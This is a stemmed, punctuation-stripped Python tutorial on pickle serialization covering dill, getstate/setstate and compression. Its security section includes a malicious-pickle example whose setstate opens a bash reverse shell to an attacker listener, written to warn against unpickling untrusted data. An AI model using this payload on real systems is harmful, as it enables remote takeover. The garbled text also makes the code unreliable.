next prev pickl modul python develop sometim want send some complex object command through network save intern state their object disk databas use later achiev thi develop serial process which support standard librari caus python pickl modul thi tutori will discuss serial deseri object which modul user should serial object python kind object serial use pickl modul python will also explain pickl modul serial object hierarchi what risk develop face while deseri object from untrust sourc serial python process serial convert data structur into linear form which store transmit through network python serial allow develop convert complex object structur into stream byte that save disk send through network develop refer thi process marshal wherea deseri revers process serial which user take stream byte transform into data structur thi process refer unmarshal develop serial mani differ situat them save intern state neural network after process train phase that they state later they don have train again python there three modul standard librari that allow develop serial deseri object pickl modul marshal modul json modul python also support xml which develop serial object json modul latest modul three thi allow develop work besid standard json file json most suitabl commonli use format data exchang there numer reason choos json format human readabl languag independ lighter than with json modul develop serial deseri differ standard python type list dict string tupl bool float none oldest modul these three modul marshal modul primari purpos read write compil bytecod python modul pyc file which develop get when python modul import interpret therefor develop marshal modul serial object recommend pickl modul python anoth method serial deseri object python thi differ from json modul thi object serial binari format whose result readabl human although faster than other work with mani other python type includ develop custom defin object develop mani differ method serial deseri object python three import guidelin conclud which method suitabl develop case are marshal modul use mostli interpret offici document warn that maintain python modifi format backward incompat type json modul safe choic develop want interoper with differ languag human readabl format python pickl modul best choic remain case suppos develop doe want human readabl format standard interoper format they requir serial custom object then they choos pickl modul insid pickl modul pickl modul python contain four method dump obj file protocol none fix import true buffer callback none dump obj protocol none fix import true buffer callback none load file fix import true encod ascii error strict buffer none load byte object fix import true encod ascii error strict buffer none first method use pickl process next method use unpickl process differ between dump dump that dump creat file which contain serial result dump return string differenti dump from dump develop rememb that dump function stand string same concept appli load load function load function use read file unpickl process load function oper string suppos user custom defin class name forexampl class with mani differ attribut each them differ type the number the string the list the dictionari the tupl exampl below explain user instanti class pickl instanc plain string after pickl class user modifi valu attribut without affect pickl string user afterward unpickl string which pickl earlier anoth variabl restor copi pickl class exampl pickl import pickl class forexampl class the number the string hello the list the dict first second third the tupl user object forexampl class user pickl object pickl dump user object here user pickl object print thi user pickl object user pickl object user object the dict none user unpickl object pickl load user pickl object here user unpickl object print thi the dict unpickl object user unpickl object the dict output thi user pickl object main forexampl class thi the dict unpickl object first second third exampl explan here process pickl end correctli store user whole instanc string main forexampl class after complet process pickl user chang their origin object make the dict attribut equal none now user process unpickl string into utterli instanc when user get deep copi their origin object structur from time when process pickl object began protocol format pickl modul python pickl modul python specif result onli readabl anoth python program although develop might work with python they should know that pickl modul advanc now thi mean that develop pickl object with some specif version python they might abl unpickl object with previou version compat thi depend protocol version that develop use while process pickl there differ protocol that pickl modul python use requir unpickl most recent python interpret directli proport high protocol version protocol version first version human readabl like other protocol protocol version first binari format protocol version introduc python protocol version python python version can not unpickl protocol version python featur support wider rang object size type default protocol start with python protocol version python featur support out band dataand improv speed band data choos specif protocol develop specifi protocol version when they call dump dump load load function they specifi protocol their interpret will default version specifi pickl default protocol attribut type pickleabl unpickl have alreadi discuss that pickl modul python serial much more type than json modul although everyth pickleabl list unpickl object also contain databas connect run thread open network socket mani other user stuck with unpickl object then there thing they first option they have third part librari exampl dill dill librari extend capabl pickl thi librari user serial fewer common type such function with yield lambda nest function mani more test thi modul user pickl lambda function exampl pickl error import pickl squar lambda user pickl pickl dump squar user tri thi code they will except becaus pickl modul python serial lambda function output picklingerror traceback most recent call last ipython input modul squar lambda user pickl pickl dump squar picklingerror can pickl function lambda dee attribut lookup lambda main fail now user replac pickl modul with dill librari they differ exampl pickl dill import dill squar lambda user pickl dill dump squar print user pickl after run abov program user that dill librari serial lambda function without error output ndill dill creat function creat code kcc ipython input lambda builtin main nnn there anoth interest featur dill librari such serial whole interpret session exampl squar lambda squar import math math sqrt import dill dill dump session test pkl exit abov exampl user start interpret import modul then defin lambda function along with other variabl they have then import dill librari call dump session function serial whole session user code correctli then they would get test pkl file their current directori output test pkl email protect dave staff test pkl now user start instanc interpret load test pkl file resort their last session exampl global item output dict item name main doc automat creat modul ipython interact environ packag none loader none spec none builtin modul builtin built builtin modul builtin built global item user user name appdata local program python python script global item get ipython bound method interactiveshel get ipython ipykernel zmqshell zmqinteractiveshel object cdd ddc exit ipython core autocal zmqexitautocal object cdd quit ipython core autocal zmqexitautocal object cdd iii global item import dill dill load session test pkl global item output dict item name main doc automat creat modul ipython interact environ packag none loader none spec none builtin modul builtin built builtin modul builtin built squar lambda squar nimport math math sqrt nimport dill ndill dump session test pkl nexit user user name appdata local program python python script squar lambda squar nimport math math sqrt nimport dill ndill dump session test pkl nexit get ipython bound method interactiveshel get ipython ipykernel zmqshell zmqinteractiveshel object cdd ddc exit ipython core autocal zmqexitautocal object cdd quit ipython core autocal zmqexitautocal object cdd iii squar lambda squar nimport math math sqrt nimport dill ndill dump session test pkl nexit dict item name main doc automat creat modul ipython interact environ packag none loader none spec none builtin modul builtin built builtin modul builtin built output output squar output here first global item statement reveal that interpret initi state mean that develop import dill librari invok load session restor their serial interpret session develop should rememb that they use dill librari instead pickl modul that standard librari doe includ dill librari slower than pickl modul dill librari serial wider rang object than pickl modul can not solv everi problem serial that develop face develop want serial object which contain databas connect then they can not work with dill librari that unseri object dill librari solut thi problem exclud object dure process serial reiniti connect after object deseri develop getstat defin which object should includ pickl process whatnot thi method allow develop specifi what they want pickl they overrid getstat then dict will use which default instanc follow exampl user defin class with sever attribut then exclud attribut process serial use getstat exampl custom pickl import pickl class foobar init self self self test self lambda getstat self attribut self dict copi attribut return attribut user foobar instanc foobar user pickl string pickl dump user foobar instanc user new instanc pickl load user pickl string print user new instanc dict abov exampl user creat object with three attribut attribut lambda which unpickl object pickl modul solv thi issu they have specifi getstat which attribut pickl user clone whole dict instanc defin attribut class then they have remov unpickl attribut after run thi code then deseri object user that instanc doe contain attribut output test user want addit initi dure process unpickl such exclud attribut back deseri instanc they thi use setstat function exampl custom unpickl import pickl class foobar init self self self test self lambda getstat self attribut self dict copi attribut return attribut setstat self state self dict state self lambda user foobar instanc foobar user pickl string pickl dump user foobar instanc user new instanc pickl load user pickl string print user new instanc dict here bypass exclud attribut setstat user ensur that object will appear dict unpickl string output test function foobar setstat local lambda compress pickl object pickl data format compact binari represent object structur still user optim their pickl string compress with bzip gzip compress pickl string with bzip user modul which provid standard librari python exampl user taken string will pickl then compress use modul exampl import pickl import user string per citt dolent etterno dolor tra perduta gent giustizia moss mio alto fattor fecemi divina podest somma sapienza primo amor dinanzi fuor cose creat ettern etterno duro lasciat ogn speranza voi intrat pickl pickl dump user string compress compress pickl len user string output len compress output user should rememb that smaller file come cost slower process secur concern with pickl modul till now have discuss pickl modul serial deseri object python process serial conveni when develop want save state their object disk transmit through network although there more thing that develop should know about pickl modul python that veri secur earlier have discuss setstat function thi method best perform more initi along with unpickl process still also use execut arbitrari code dure unpickl process there noth much develop reduc risk basic rule develop should never unpickl data which come from untrust sourc transmit through insecur network prevent attack user librari like hmac sign data make sure that been tamper with exampl unpickl tamper pickl expos system user attack remot import pickl import class foobar init self pass getstat self return self dict setstat self state attack from attack listen port system bin bash bin bash dev tcp user foobar foobar user pickl pickl dump user foobar user unpickl pickl load user pickl exampl abov exampl process unpickl execut setstat which will execut bash command open remot shell system port thi user safe test scrip their linux box first they have open termin then command list connect port exampl thi termin will attack then user open anoth termin same comput system execut python code unpick malici code user make sure that they have chang address code address their attack termin after execut code shell expos attack remot now bash shell will visibl attack consol thi consol oper directli now system which attack exampl output bash control thi shell default interact shell zsh updat your account zsh pleas chsh bin zsh more detail pleas visit http support appl com bash conclus thi articl discuss serial deseri object use differ modul python pickl modul better than other have also explain some object can not unpickl avoid problem creat them next topichow convert byte string python prev next